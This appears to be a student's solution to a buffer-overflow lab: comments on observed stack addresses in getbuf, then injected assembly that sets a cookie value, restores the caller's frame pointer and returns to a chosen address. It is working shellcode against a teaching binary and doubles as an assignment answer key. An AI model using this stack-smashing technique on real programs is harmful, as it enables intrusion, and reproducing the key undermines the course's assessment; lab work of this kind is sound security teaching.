# In getbuf:
#   str start at -0x2e0(%ebp): %ebp-736 
# ebp of getbuf:
# 1. 0x55683670     -0x2e0(%ebp):
# 2. 0x55683680     -0x2e0(%ebp):
# 3. 0x55683680     -0x2e0(%ebp):
# 4. 0x55683680     -0x2e0(%ebp):
# 5. 0x556836e0     -0x2e0(%ebp):
# use 0x55683580 for ret addr.

movl $0x60f73576,%eax       # cookie
lea  0x58(%esp),%ebp        # restore %ebp to frame base of testn
pushl $0x080495fa           # return addr 
ret